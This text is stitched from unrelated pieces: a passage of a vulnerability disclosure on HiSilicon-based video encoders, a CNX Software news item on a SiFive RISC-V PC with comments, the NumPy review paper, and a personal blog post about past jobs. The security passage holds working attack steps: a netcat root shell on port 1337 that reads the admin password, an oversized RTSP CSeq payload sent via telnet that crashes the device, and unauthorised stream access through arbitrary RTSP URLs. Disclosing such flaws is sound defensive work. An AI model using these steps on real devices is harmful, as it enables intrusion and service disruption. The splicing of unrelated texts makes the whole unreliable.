After the request is processed, use netcat to connect to the device on port 1337 and execute any command on the encoder as root. For example, you can retrieve the actual admin password stored in /box/box.ini:

$ nc encoder 1337
sh -i
# whoami
root
# grep html_password /box/box.ini
html_password:s3cr3t


Buffer overflow: definite DoS and potential RCE (CVE-2020-24214)

In my previous life as a C/C++ developer, I have seen many buffer overflows. I have even programmed some of them myself. Unintentionally, of course :) With a low level language like C/C++, with a lot of control over data processing and a large set of old-fashioned insecure functions, it is very easy to shoot oneself in the foot.

A classic way to cause a buffer overflow is to use a printf()-like function with formatting string and arguments, but not properly ensuring that the result will fit in the destination buffer. I searched for all occurrences of printf()-like functions in the decompiled code, and found several interesting ones like this:


box_rtspParseParam() parses the CSeq parameter string, and the pointer to the value is then passed to the sprintf() call. The result is put in acStack2064 buffer on the stack. Since the size of the buffer is fixed, this looks like a good candidate for a stack-based buffer overflow.

RTSP is a text-based protocol, and prior to this research I was not familiar with it at all. To understand RTSP, I ran VLC Media Player, pointed it to the RTSP URL of my device, and captured the traffic with Wireshark:

OPTIONS rtsp://10.2.2.51:554/0 RTSP/1.0

CSeq: 7
User-Agent: LibVLC/3.0.8 (LIVE555 Streaming Media v2018.02.18)
Session: 305394826


Now I have an idea of how to write an exploit, and it’s trivially simple. First, create a text file, let’s call it teardown-bof:

TEARDOWN /0 RTSP/1.0
CSeq: 0000000000000000000000000000...




Notes:

Repeat the 0s about 3000 times.
  The two blank lines at the bottom are mandatory.
Send this file to the RTSP server:

cat teardown-bof | telnet encoder 554


and observe the application crash on the device:

[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x30303030


Multiple registers, including the program counter pc, are overwritten with the user supplied payload (0x30 or '0').

This allows an unauthenticated attacker to crash the application, effectively causing denial of service. The sole purpose of the device is reliable video streaming, so denial of service is a significant issue. The watchdog process will reboot the device in approximately 1 minute, but an attacker can launch the exploit once a minute, making the device completely useless.

The big question is whether code execution is possible. It appears that ASLR is enabled on all devices I was testing. Brute forcing stack base address is not feasible, as the application is very unstable after the overflow occurs, causing an automatic device reboot. The only thing that seems to be possible is combining this vulnerability with the Arbitrary file disclosure via path traversal (CVE-2020-24219). An attacker can read the process memory mapping information from /proc/<pid>/maps to get the stack address information and redirect the program flow to the supplied shellcode. On the other hand, with the arbitrary file read one can simply retrieve the admin password and get full access to the device, so stack overflow exploitation is moot at that point.

Unauthorized video stream access via RTSP (CVE-2020-24216)

While playing with the RTSP processing code, I noticed that the RTSP URL had no effect. In other words, I could set it to a secret string:


… but it would still be available via rtsp://encoder/0. Moreover, it would be available via any URL.

Here is the secret URL I set via the UI, and it works as expected:

$ curl -v rtsp://encoder/secret-stream
*   Trying 10.7.7.52...
* TCP_NODELAY set
* Connected to encoder (10.7.7.52) port 554 (#0)

However, the original /0 still works:

$ curl -v rtsp://encoder/0
*   Trying 10.7.7.52...
* TCP_NODELAY set
* Connected to encoder (10.7.7.52) port 554 (#0)

Moreover, for some strange reason, an arbitrary URL works just as well:

$ curl -v rtsp://encoder/foobar
*   Trying 10.7.7.52...
* TCP_NODELAY set
* Connected to encoder (10.7.7.52) port 554 (#0)

Disclosure

I completed my research in mid-July 2020. The next step would be to notify the affected vendors so they could fix the issues.

Affected vendors

During my research, I had physical access to the following devices, and confirmed them to be vulnerable:

Several models from URayTech (all vulnerabilities)
  IPTV encoder from J-Tech Digital (not vulnerable to telnet backdoor and path traversal)
  VeCASTER PRO from Pro Video Instruments (not vulnerable to telnet backdoor and path traversal)
However, similar hardware video encoders are manufactured/whitelabeled/sold all over the world by a multitude of vendors. After browsing through online stores, looking at product pages, reading documentation, downloading and analyzing firmware updates, I was able to identify several other vendors I believe are also affected:

Network Technologies Incorporated (NTI)
  Oupree
  MINE Technology
  Blankom
  ISEEVY
  Orivision
  WorldKast/procoder
  Digicast
Coordinated disclosure

I reported my findings to CERT Coordination Center (CERT/CC) who initiated the coordinated disclosure process. Together, we made several attempts to contact affected vendors, with very little success. Only one company, Pro Video Instruments (PVI), reacted promptly and took the report seriously. I would like to thank PVI for their cooperation.

Many thanks to Vijay Sarvepalli from CERT/CC for managing and coordinating the disclosure process!

Remediation

At the time of this publication, most vendors have not issued firmware updates to address the reported vulnerabilities. If you own one of these encoders, contact your vendor and ask for a fix. If a firmware update is available, ask the vendor to confirm whether all vulnerabilities have been fixed. If the fix is unavailable, or is partial, make sure the device is on a trusted network, no ports are exposed externally, and firewall rules block untrusted users from accessing the device.

Conclusion

This research demonstrates a number of application vulnerabilities in devices from multiple vendors. These devices are based on the same hardware platform and share the same software API. While most vulnerabilities seem unintentional (i.e. coding mistakes), one of them stands out. The hardcoded password is a deliberate backdoor. Chinese companies such as Huawei are known for backdooring their products (and even trying to explain how backdoors are good), so it is not a surprise their HiSilicon video encoders are backdoored as well.

Update 2020-09-17: Huawei issued a statement saying that none of the vulnerabilities have been introduced by HiSilicon chips and SDK packages. I will update this article as more information comes in.

When we hear the term application security, we don’t necessarily think of a little device with some specialized hardware-based functionality. Likewise, the term internet of things does not usually make us think about application security. However, there is a huge overlap between AppSec and IoT. Virtually every device runs some kind of an operating system and some kind of custom code. Many of them listen on ports. Many allow administrative access. And unfortunately, the engineering teams behind these devices do not pay enough attention to security considerations around the software. As a result, flaws creep in, making the device owners vulnerable to many kinds of attacks. Complex supply chains and inadequate support make these vulnerabilities difficult to address. We will continue to see these bugs in all kinds of connected devices for the foreseeable future, but more published research will hopefully increase awareness and make the vendors take application security more seriously.

The Linux PC will feature a new Freedom U740 RISC-V SoC with modern I\/Os."",""articleSection"":""SiFive"",""articleBody"":""In recent years, people have discussed the need to have Arm-based PCs or workstations for developers to work directly on the target hardware, and there are now several options including SynQuacer E-Series 24-Core Arm PC, Ampere eMAG 64bit Arm Workstation, and HoneyComb LX2K 16-core Arm Workstation.    Now it appears we'll soon get something similar for RISC-V architecture with SiFive to debut the first RISC-V PC for developers at the Linley Fall Processor Conference 2020 taking place on October 20-22 and October 27-29. The PC will be powered by Freedom U740 next-generation RISC-V processor that will also be introduced at the event.        We have very few details about this point in time, but the company points the SiFive Freedom U740 (FU740) SoC will enable professional developers to create RISC-V applications from bare-metal to Linux-based. The processor is said to combines a heterogeneous mix+match core complex with modern PC expansion capabilities, which probably means PCIe, SATA etc.., and the company will provide tools to ease professional software development.    We'll find out more next month, as Dr. Yunsup Lee, CTO of SiFiv, will showcase the \""world\u2019s first RISC-V PC\"" at the Linley Conference. That does not necessarily mean it will be launched at that time, but at least there will be a working demo. Technically, it's not the first RISC-V PC, as some people previously made a PC with HiFive Unleashed RISC-V Linux board, but SiFive PC should be the first one that's usable and commercially available.    You may find a few more details on the press release, but the best way to find more details is to register for free to the Linley Group Fall Virtual Processor Conference 2020 that is intended for chip designers, system designers, equipment vendors, OEM\/ODMs, service providers, press, and the financial community."",""keywords"":""Linux, risc-v, sifive, "",""name"":""SiFive to Debut RISC-V PC for

The PC will be powered by Freedom U740 next-generation RISC-V processor that will also be introduced at the event.Illustration Only – That’s an Arm workstation with a RISC-V logo on top…We have very few details about this point in time, but the company points the SiFive Freedom U740 (FU740) SoC will enable professional developers to create RISC-V applications from bare-metal to Linux-based. The processor is said to combines a heterogeneous mix+match core complex with modern PC expansion capabilities, which probably means PCIe, SATA etc.., and the company will provide tools to ease professional software development.We’ll find out more next month, as Dr. Yunsup Lee, CTO of SiFiv, will showcase the “world’s first RISC-V PC” at the Linley Conference. That does not necessarily mean it will be launched at that time, but at least there will be a working demo. Technically, it’s not the first RISC-V PC, as some people previously made a PC with HiFive Unleashed RISC-V Linux board, but SiFive PC should be the first one that’s usable and commercially available.You may find a few more details on the press release, but the best way to find more details is to register for free to the Linley Group Fall Virtual Processor Conference 2020 that is intended for chip designers, system designers, equipment vendors, OEM/ODMs, service providers, press, and the financial community.Jean-Luc Aufranc (CNXSoft)Jean-Luc started CNX Software in 2010 as a part-time endeavor, before quitting his job as a software engineering manager, and starting to write daily news, and reviews full time later in 2011.Support CNX Software - Donate via PayPal, become a Patron on Patreon, or buy review samplesAdvertisements  Your browser does not support the video tag.Related posts:SiFive Introduces HiFive Unleashed RISC-V Linux Development Board (Crowdfunding) RISC-V Keynote at Embedded Linux Conference 2018 (Video) HiFive Unleashed RISC-V Linux Development Board Gets a $2000 FPGA Expansion Board SiFive Introduces 7 Series RISC-V Cores with E7, S7 and U7 series Linux 5.8 Release – Main Changes, Arm, MIPS, and RISC-V Architectures  googletag.cmd.push(function() { googletag.display('div-gpt-ad-1597905513858-0'); });CategoriesHardware, Linux, SiFiveTagsLinux, risc-v, sifiveConnect with:      Subscribe   LoginNotify of new follow-up commentsnew replies to my comments              {} [+]  Name* Email* Website I agree to the Privacy Policy The comment form collects your name, email and content to allow us keep track of the comments placed on the website.

The only multi-core U7 core — the U74-MC — offers four identical mainstream cores along with the S7 companion core, so there is nothing to mix and match. SiFive may intend to launch two new octa-core capable U7 core variants with different clock speeds. In introducing the U8-series, SiFive posted a block diagram for a hypothetical octa-core SoC that uses mix+match to combine four, up to 2.6GHz U84 cores with four U74-MC… Read more » 0  Reply   Author Jean-Luc Aufranc (CNXSoft)  6 days ago        Anonymous Possible, but SiFive may also consider 4x U7 + 1x S7 to be “mix+match”.U74 is just an IP core like “Arm Cortex-A55” Fredoon U740 is an actual processor likely to be based on U74 core. We’ll find out soon enough. 1  Reply  radek  6 days ago        Jean-Luc Aufranc (CNXSoft) Maybe had better use U84. According to press info = cortex A72. But they dont have GPU…. nobody is working on it… maybe Imagination ???? it will cost a fortune 0  Reply  leonanavi  8 days ago        zoobab yes, I am afraid about the same. So far RISC-V dev boards capable of running Linux like HiFive Unleashed have been quite expensive. If the prices drop to match ARM it is going to become a very interesting market 🙂 3  Reply   David Willmore  8 days ago        leonanavi If ARM prices don’t raise up to meet it. 🙁 3  Reply   leonanavi  8 days ago        David Willmore yes, you are right. This is also an option. 0  Reply   itchy n scratchy  8 days ago        leonanavi Let’s hope antitrust will stop Nvidia madness… 2  Reply  shfil  8 days ago   Imho risc-v doesn’t need wifi, bluetooth etc. Having pcie slots and dimm memory would blow off most of arm sbc. 1  Reply  Sander  7 days ago   Can we place bets about the price?500 euro range1000 euro range1500 euro range2000 euro rangeMy guess: 1500+ euro. 0  Reply   lume  4 days ago        Sander Once development pc meant cheap hardware, no frills, where the manufacturer most of the time sold it below price so that it could be adopted and tested by as many people as possible. Now it’s completely the opposite: this hardware is sold at crazy prices and bought most of the time by people who will keep it in a museum. Did you say 1500 euros? I say at least 3000 for a pc. 0  Reply   sander  4 days ago        lume at least 3000 for a pc … Ouch!  0  ReplyAdvertisements googletag.cmd.push(function() { googletag.display('div-gpt-ad-cnx-softwarecom35142'); });Post navigationPrevious PostPrevious Silicon Labs Introduces Bluetooth 5.2 BGM220S SiP and BGM220P PCB ModuleNext PostNext Low-cost Amlogic S905L2 TV Boxes Show Up on Aliexpress for $20+  Subscribe to CNXSoft Blog by Email  Search for:  SearchAdvertisements Trending Posts – Last 7 DaysSponsors     Advertisements googletag.cmd.push(function() { googletag.display('div-gpt-ad-cnx-softwarecom35144'); });Recent Commentslezioul on AAWireless Enables Wireless Android Auto on Android 9.0+ Smartphones (Crowdfunding)Sander on Rivet Networks launches Killer E3100 2.5GbE USB adapteritchy n scratchy on Wallys WiFi 5 (802.11ac) mini PCIe cards deliver higher Tx power and performance (Sponsored)itchy n scratchy on GigaDevice GD32E5 Cortex-M33 microcontrollers target motor and industrial controlfossxplorer on AMD Launches Chromebook-Optimized Ryzen and Athlon 3000 C-Series Mobile ProcessorsSubscribe to Comments RSS FeedAdvertisements Embedded Systems JobsEmbedded Software Engineer2 September 2020 - Boise, United States of AmericaAs an Embedded Engineer for SIG - Micron Systems Integration Group in Boise Idaho, you will be working on a wide range of Software and Hardware Engineering responsibilities.

                AbstractArray programming provides a powerful, compact and expressive syntax for accessing, manipulating and operating on data in vectors, matrices and higher-dimensional arrays. NumPy is the primary array programming library for the Python language. It has an essential role in research analysis pipelines in fields as diverse as physics, chemistry, astronomy, geoscience, biology, psychology, materials science, engineering, finance and economics. For example, in astronomy, NumPy was an important part of the software stack used in the discovery of gravitational waves1 and in the first imaging of a black hole2. Here we review how a few fundamental array concepts lead to a simple and powerful programming paradigm for organizing, exploring and analysing scientific data. NumPy is the foundation upon which the scientific Python ecosystem is constructed. It is so pervasive that several projects, targeting audiences with specialized needs, have developed their own NumPy-like interfaces and array objects. Owing to its central position in the ecosystem, NumPy increasingly acts as an interoperability layer between such array computation libraries and, together with its application programming interface (API), provides a flexible framework to support the next decade of scientific and industrial analysis.

                    MainTwo Python array packages existed before NumPy. The Numeric package was developed in the mid-1990s and provided array objects and array-aware functions in Python. It was written in C and linked to standard fast implementations of linear algebra3,4. One of its earliest uses was to steer C++ applications for inertial confinement fusion research at Lawrence Livermore National Laboratory5. To handle large astronomical images coming from the Hubble Space Telescope, a reimplementation of Numeric, called Numarray, added support for structured arrays, flexible indexing, memory mapping, byte-order variants, more efficient memory use, flexible IEEE 754-standard error-handling capabilities, and better type-casting rules6. Although Numarray was highly compatible with Numeric, the two packages had enough differences that it divided the community; however, in 2005 NumPy emerged as a ‘best of both worlds’ unification7—combining the features of Numarray with the small-array performance of Numeric and its rich C API.Now, 15 years later, NumPy underpins almost every Python library that does scientific or numerical computation8,9,10,11, including SciPy12, Matplotlib13, pandas14, scikit-learn15 and scikit-image16. NumPy is a community-developed, open-source library, which provides a multidimensional Python array object along with array-aware functions that operate on it. Because of its inherent simplicity, the NumPy array is the de facto exchange format for array data in Python.NumPy operates on in-memory arrays using the central processing unit (CPU). To utilize modern, specialized storage and hardware, there has been a recent proliferation of Python array packages. Unlike with the Numarray–Numeric divide, it is now much harder for these new libraries to fracture the user community—given how much work is already built on top of NumPy. However, to provide the community with access to new and exploratory technologies, NumPy is transitioning into a central coordinating mechanism that specifies a well defined array programming API and dispatches it, as appropriate, to specialized array implementations.NumPy arraysThe NumPy array is a data structure that efficiently stores and accesses multidimensional arrays17 (also known as tensors), and enables a wide variety of scientific computation. It consists of a pointer to memory, along with metadata used to interpret the data stored there, notably ‘data type’, ‘shape’ and ‘strides’ (Fig. 1a).Fig. 1: The NumPy array incorporates several fundamental array concepts.a, The NumPy array data structure and its associated metadata fields. b, Indexing an array with slices and steps. These operations return a ‘view’ of the original data. c, Indexing an array with masks, scalar coordinates or other arrays, so that it returns a ‘copy’ of the original data. In the bottom example, an array is indexed with other arrays; this broadcasts the indexing arguments before performing the lookup. d, Vectorization efficiently applies operations to groups of elements. e, Broadcasting in the multiplication of two-dimensional arrays. f, Reduction operations act along one or more axes. In this example, an array is summed along select axes to produce a vector, or along two axes consecutively to produce a scalar. g, Example NumPy code, illustrating some of these concepts.Full size imageThe data type describes the nature of elements stored in an array. An array has a single data type, and each element of an array occupies the same number of bytes in memory. Examples of data types include real and complex numbers (of lower and higher precision), strings, timestamps and pointers to Python objects.The shape of an array determines the number of elements along each axis, and the number of axes is the dimensionality of the array. For example, a vector of numbers can be stored as a one-dimensional array of shape N, whereas colour videos are four-dimensional arrays of shape (T, M, N, 3).Strides are necessary to interpret computer memory, which stores elements linearly, as multidimensional arrays. They describe the number of bytes to move forward in memory to jump from row to row, column to column, and so forth. Consider, for example, a two-dimensional array of floating-point numbers with shape (4, 3), where each element occupies 8 bytes in memory. To move between consecutive columns, we need to jump forward 8 bytes in memory, and to access the next row, 3 × 8 = 24 bytes. The strides of that array are therefore (24, 8). NumPy can store arrays in either C or Fortran memory order, iterating first over either rows or columns. This allows external libraries written in those languages to access NumPy array data in memory directly.Users interact with NumPy arrays using ‘indexing’ (to access subarrays or individual elements), ‘operators’ (for example, +, − and × for vectorized operations and @ for matrix multiplication), as well as ‘array-aware functions’; together, these provide an easily readable, expressive, high-level API for array programming while NumPy deals with the underlying mechanics of making operations fast.Indexing an array returns single elements, subarrays or elements that satisfy a specific condition (Fig. 1b). Arrays can even be indexed using other arrays (Fig. 1c). Wherever possible, indexing that retrieves a subarray returns a ‘view’ on the original array such that data are shared between the two arrays. This provides a powerful way to operate on subsets of array data while limiting memory usage.To complement the array syntax, NumPy includes functions that perform vectorized calculations on arrays, including arithmetic, statistics and trigonometry (Fig. 1d). Vectorization—operating on entire arrays rather than their individual elements—is essential to array programming. This means that operations that would take many tens of lines to express in languages such as C can often be implemented as a single, clear Python expression. This results in concise code and frees users to focus on the details of their analysis, while NumPy handles looping over array elements near-optimally—for example, taking strides into consideration to best utilize the computer’s fast cache memory.When performing a vectorized operation (such as addition) on two arrays with the same shape, it is clear what should happen. Through ‘broadcasting’ NumPy allows the dimensions to differ, and produces results that appeal to intuition. A trivial example is the addition of a scalar value to an array, but broadcasting also generalizes to more complex examples such as scaling each column of an array or generating a grid of coordinates. In broadcasting, one or both arrays are virtually duplicated (that is, without copying any data in memory), so that the shapes of the operands match (Fig. 1d). Broadcasting is also applied when an array is indexed using arrays of indices (Fig. 1c).Other array-aware functions, such as sum, mean and maximum, perform element-by-element ‘reductions’, aggregating results across one, multiple or all axes of a single array. For example, summing an n-dimensional array over d axes results in an array of dimension n − d (Fig. 1f).NumPy also includes array-aware functions for creating, reshaping, concatenating and padding arrays; searching, sorting and counting data; and reading and writing files. It provides extensive support for generating pseudorandom numbers, includes an assortment of probability distributions, and performs accelerated linear algebra, using one of several backends such as OpenBLAS18,19 or Intel MKL optimized for the CPUs at hand (see Supplementary Methods for more details).Altogether, the combination of a simple in-memory array representation, a syntax that closely mimics mathematics, and a variety of array-aware utility functions forms a productive and powerfully expressive array programming language.Scientific Python ecosystemPython is an open-source, general-purpose interpreted programming language well suited to standard programming tasks such as cleaning data, interacting with web resources and parsing text. Adding fast array operations and linear algebra enables scientists to do all their work within a single programming language—one that has the advantage of being famously easy to learn and teach, as witnessed by its adoption as a primary learning language in many universities.Even though NumPy is not part of Python’s standard library, it benefits from a good relationship with the Python developers. Over the years, the Python language has added new features and special syntax so that NumPy would have a more succinct and easier-to-read array notation. However, because it is not part of the standard library, NumPy is able to dictate its own release policies and development patterns.SciPy and Matplotlib are tightly coupled with NumPy in terms of history, development and use. SciPy provides fundamental algorithms for scientific computing, including mathematical, scientific and engineering routines. Matplotlib generates publication-ready figures and visualizations. The combination of NumPy, SciPy and Matplotlib, together with an advanced interactive environment such as IPython20 or Jupyter21, provides a solid foundation for array programming in Python. The scientific Python ecosystem (Fig. 2) builds on top of this foundation to provide several, widely used technique-specific libraries15,16,22, that in turn underlie numerous domain-specific projects23,24,25,26,27,28. NumPy, at the base of the ecosystem of array-aware libraries, sets documentation standards, provides array testing infrastructure and adds build support for Fortran and other compilers.Fig. 2: NumPy is the base of the scientific Python ecosystem.Essential libraries and projects that depend on NumPy’s API gain access to new array implementations that support NumPy’s array protocols (Fig. 3).Full size imageMany research groups have designed large, complex scientific libraries that add application-specific functionality to the ecosystem. For example, the eht-imaging library29, developed by the Event Horizon Telescope collaboration for radio interferometry imaging, analysis and simulation, relies on many lower-level components of the scientific Python ecosystem. In particular, the EHT collaboration used this library for the first imaging of a black hole. Within eht-imaging, NumPy arrays are used to store and manipulate numerical data at every step in the processing chain: from raw data through calibration and image reconstruction. SciPy supplies tools for general image-processing tasks such as filtering and image alignment, and scikit-image, an image-processing library that extends SciPy, provides higher-level functionality such as edge filters and Hough transforms. The ‘scipy.optimize’ module performs mathematical optimization. NetworkX22, a package for complex network analysis, is used to verify image comparison consistency. Astropy23,24 handles standard astronomical file formats and computes time–coordinate transformations. Matplotlib is used to visualize data and to generate the final image of the black hole.The interactive environment created by the array programming foundation and the surrounding ecosystem of tools—inside of IPython or Jupyter—is ideally suited to exploratory data analysis. Users can fluidly inspect, manipulate and visualize their data, and rapidly iterate to refine programming statements. These statements are then stitched together into imperative or functional programs, or notebooks containing both computation and narrative. Scientific computing beyond exploratory work is often done in a text editor or an integrated development environment (IDE) such as Spyder. This rich and productive environment has made Python popular for scientific research.To complement this facility for exploratory work and rapid prototyping, NumPy has developed a culture of using time-tested software engineering practices to improve collaboration and reduce error30. This culture is not only adopted by leaders in the project but also enthusiastically taught to newcomers. The NumPy team was early to adopt distributed revision control and code review to improve collaboration on code, and continuous testing that runs an extensive battery of automated tests for every proposed change to NumPy. The project also has comprehensive, high-quality documentation, integrated with the source code31,32,33.This culture of using best practices for producing reliable scientific software has been adopted by the ecosystem of libraries that build on NumPy. For example, in a recent award given by the Royal Astronomical Society to Astropy, they state: “The Astropy Project has provided hundreds of junior scientists with experience in professional-standard software development practices including use of version control, unit testing, code review and issue tracking procedures. This is a vital skill set for modern researchers that is often missing from formal university education in physics or astronomy”34. Community members explicitly work to address this lack of formal education through courses and workshops35,36,37.The recent rapid growth of data science, machine learning and artificial intelligence has further and dramatically boosted the scientific use of Python. Examples of its important applications, such as the eht-imaging library, now exist in almost every discipline in the natural and social sciences. These tools have become the primary software environment in many fields. NumPy and its ecosystem are commonly taught in university courses, boot camps and summer schools, and are the focus of community conferences and workshops worldwide. NumPy and its API have become truly ubiquitous.Array proliferation and interoperabilityNumPy provides in-memory, multidimensional, homogeneously typed (that is, single-pointer and strided) arrays on CPUs. It runs on machines ranging from embedded devices to the world’s largest supercomputers, with performance approaching that of compiled languages. For most its existence, NumPy addressed the vast majority of array computation use cases.However, scientific datasets now routinely exceed the memory capacity of a single machine and may be stored on multiple machines or in the cloud. In addition, the recent need to accelerate deep-learning and artificial intelligence applications has led to the emergence of specialized accelerator hardware, including graphics processing units (GPUs), tensor processing units (TPUs) and field-programmable gate arrays (FPGAs). Owing to its in-memory data model, NumPy is currently unable to directly utilize such storage and specialized hardware. However, both distributed data and also the parallel execution of GPUs, TPUs and FPGAs map well to the paradigm of array programming: therefore leading to a gap between available modern hardware architectures and the tools necessary to leverage their computational power.The community’s efforts to fill this gap led to a proliferation of new array implementations. For example, each deep-learning framework created its own arrays; the PyTorch38, Tensorflow39, Apache MXNet40 and JAX arrays all have the capability to run on CPUs and GPUs in a distributed fashion, using lazy evaluation to allow for additional performance optimizations. SciPy and PyData/Sparse both provide sparse arrays, which typically contain few non-zero values and store only those in memory for efficiency. In addition, there are projects that build on NumPy arrays as data containers, and extend its capabilities. Distributed arrays are made possible that way by Dask, and labelled arrays—referring to dimensions of an array by name rather than by index for clarity, compare x[:, 1] versus x.loc[:, 'time']—by xarray41.Such libraries often mimic the NumPy API, because this lowers the barrier to entry for newcomers and provides the wider community with a stable array programming interface. This, in turn, prevents disruptive schisms such as the divergence between Numeric and Numarray. But exploring new ways of working with arrays is experimental by nature and, in fact, several promising libraries (such as Theano and Caffe) have already ceased development. And each time that a user decides to try a new technology, they must change import statements and ensure that the new library implements all the parts of the NumPy API they currently use.Ideally, operating on specialized arrays using NumPy functions or semantics would simply work, so that users could write code once, and would then benefit from switching between NumPy arrays, GPU arrays, distributed arrays and so forth as appropriate. To support array operations between external array objects, NumPy therefore added the capability to act as a central coordination mechanism with a well specified API (Fig. 2).To facilitate this interoperability, NumPy provides ‘protocols’ (or contracts of operation), that allow for specialized arrays to be passed to NumPy functions (Fig. 3). NumPy, in turn, dispatches operations to the originating library, as required. Over four hundred of the most popular NumPy functions are supported. The protocols are implemented by widely used libraries such as Dask, CuPy, xarray and PyData/Sparse. Thanks to these developments, users can now, for example, scale their computation from a single machine to distributed systems using Dask. The protocols also compose well, allowing users to redeploy NumPy code at scale on distributed, multi-GPU systems via, for instance, CuPy arrays embedded in Dask arrays. Using NumPy’s high-level API, users can leverage highly parallel code execution on multiple systems with millions of cores, all with minimal code changes42.Fig. 3: NumPy’s API and array protocols expose new arrays to the ecosystem.In this example, NumPy’s ‘mean’ function is called on a Dask array. The call succeeds by dispatching to the appropriate library implementation (in this case, Dask) and results in a new Dask array. Compare this code to the example code in Fig. 1g.Full size imageThese array protocols are now a key feature of NumPy, and are expected to only increase in importance. The NumPy developers—many of whom are authors of this Review—iteratively refine and add protocol designs to improve utility and simplify adoption.DiscussionNumPy combines the expressive power of array programming, the performance of C, and the readability, usability and versatility of Python in a mature, well tested, well documented and community-developed library. Libraries in the scientific Python ecosystem provide fast implementations of most important algorithms. Where extreme optimization is warranted, compiled languages can be used, such as Cython43, Numba44 and Pythran45; these languages extend Python and transparently accelerate bottlenecks. Owing to NumPy’s simple memory model, it is easy to write low-level, hand-optimized code, usually in C or Fortran, to manipulate NumPy arrays and pass them back to Python. Furthermore, using array protocols, it is possible to utilize the full spectrum of specialized hardware acceleration with minimal changes to existing code.NumPy was initially developed by students, faculty and researchers to provide an advanced, open-source array programming library for Python, which was free to use and unencumbered by license servers and software protection dongles. There was a sense of building something consequential together for the benefit of many others. Participating in such an endeavour, within a welcoming community of like-minded individuals, held a powerful attraction for many early contributors.These user–developers frequently had to write code from scratch to solve their own or their colleagues’ problems—often in low-level languages that preceded Python, such as Fortran46 and C. To them, the advantages of an interactive, high-level array library were evident. The design of this new tool was informed by other powerful interactive programming languages for scientific computing such as Basis47,48,49,50, Yorick51, R52 and APL53, as well as commercial languages and environments such as IDL (Interactive Data Language) and MATLAB.What began as an attempt to add an array object to Python became the foundation of a vibrant ecosystem of tools. Now, a large amount of scientific work depends on NumPy being correct, fast and stable. It is no longer a small community project, but core scientific infrastructure.The developer culture has matured: although initial development was highly informal, NumPy now has a roadmap and a process for proposing and discussing large changes. The project has formal governance structures and is fiscally sponsored by NumFOCUS, a nonprofit that promotes open practices in research, data and scientific computing. Over the past few years, the project attracted its first funded development, sponsored by the Moore and Sloan Foundations, and received an award as part of the Chan Zuckerberg Initiative’s Essentials of Open Source Software programme. With this funding, the project was (and is) able to have sustained focus over multiple months to implement substantial new features and improvements. That said, the development of NumPy still depends heavily on contributions made by graduate students and researchers in their free time (see Supplementary Methods for more details).NumPy is no longer merely the foundational array library underlying the scientific Python ecosystem, but it has become the standard API for tensor computation and a central coordinating mechanism between array types and technologies in Python. Work continues to expand on and improve these interoperability features.Over the next decade, NumPy developers will face several challenges. New devices will be developed, and existing specialized hardware will evolve to meet diminishing returns on Moore’s law. There will be more, and a wider variety of, data science practitioners, a large proportion of whom will use NumPy. The scale of scientific data gathering will continue to increase, with the adoption of devices and instruments such as light-sheet microscopes and the Large Synoptic Survey Telescope (LSST)54. New generation languages, interpreters and compilers, such as Rust55, Julia56 and LLVM57, will create new concepts and data structures, and determine their viability.Through the mechanisms described in this Review, NumPy is poised to embrace such a changing landscape, and to continue playing a leading part in interactive scientific computation, although to do so will require sustained funding from government, academia and industry. But, importantly, for NumPy to meet the needs of the next decade of data science, it will also need a new generation of graduate students and community contributors to drive it forward.References1.Abbott, B.

        To All The Jobs I Had Before
    
      Sep 16, 2020
      
  
    My career as a developer started 5 years ago. Before that I have 15 years work experience from other roles, and I‘ve been thinking about what I learnt from all those jobs I had before.

Questioning predefined tasks 🤔

ELDERLY CARE was my first full time job, providing care services for senior citizens in their homes. The shift started with receiving a work list printed on paper. These were public services that had been granted based on certain requirements, so it was pretty much an official work list. But…

I learnt that the details could be outdated, misunderstood, or sometimes just not the most important task to prioritize that day. I became critical of instructions written by people who where not there, and tried to understand individual needs instead. Also: an entire year of hard core training in empathy.

Systems thinking ♻️

THE FISH FACTORY processed 300 t pelagic fish daily, with intake from the boat dependent on work done in sequence by 50 people. Most packing 20kg boxes, some driving a fork lift truck or operating a fillet machine. The elevator moved pallets frozen the previous day, and it was such a critical bottle neck that one person was assigned elevator duty to avoid prolonged stops.

I learnt how constraints affect the system as a whole. If the elevator or any other part of the system was too slow, the entire production would grind to a halt. You truly grasp the concept of work flow when it is physical. Boxes clogging the conveyor belts, pallets queueing up with no floor space, lines of people literally just having to wait because their work stations are blocked from progress.

Influencing decisions 💥

UNIONS are valuable and I was a pissed-off 21 year old elected representative, capable of reading and utilizing the labour laws better than company management. Fun times. Buy me a beer and I can tell you the story of when I intentionally got myself fired to dispute illegal work contracts.

I learnt that organisations consist of people and decisions do not materialize out of thin air. You can often impact more than you think, even if you feel like you have no say at all. Companies can have the most rigid power structures in place, and it is still possible to push, prod, nudge, plant ideas.

Computers are not magic 💻

OIL INDUSTRY PROCUREMENT stood for a handful of temp office jobs over the years. I quickly picked up how to use Office programs and found my way around ERP systems, which landed me these gigs as a person who could use whatever software without the courses upfront.

I learnt that I am apparently “good with computers”.

Improving daily work 🛠

THE BOAT ENGINE FACTORY provided steady work all year round, unlike the fish factory. Workers were still typically considered interchangeable units, especially in the warehouse functions, but there was variety and autonomy — which meant we excelled in creating routines and optimization hacks.

I learnt how being lazy is a fantastic trait that motivates improvements. Faster, so we could have longer coffee breaks. Easier, so we could think about other things than the tedious. More resilient, because getting packages in return with missing or broken spare parts was boring repeat work.

Limitations are my jam ⏳

DESIGN AGENCY for 4 years, everything from print to HTML/CSS for static sites. A lot of designers enjoy working in a limitless realm for as long as possible, before they are forced to reign it in. They tried to teach this approach to creativity when I studied graphic design, but I revel in the realistic.

I learnt to prefer discovering the limits early, then proceeding to be creative within those. I don’t get thrilled about what we could potentially do with unlimited time and twice the number of people. I genuinely get most excited by what we can do here and now with the resources we have.

Effectively involving stakeholders 💬

RUNNING A BUSINESS as a freelance frontender for 7 years. When building custom websites at fixed project prices, it was essential to know exactly how to keep clients in the loop. Working in solitude, attempting to solve all the problems before a big reveal, would have been a terrible approach.

I learnt the value of showing work in progress. I got the hang of asking the right questions, and setting up a process that allowed me to get direction along the way. To this day, I don’t try to impress with my suggestions — instead I bring others along and utilize transparency while work in iterations.

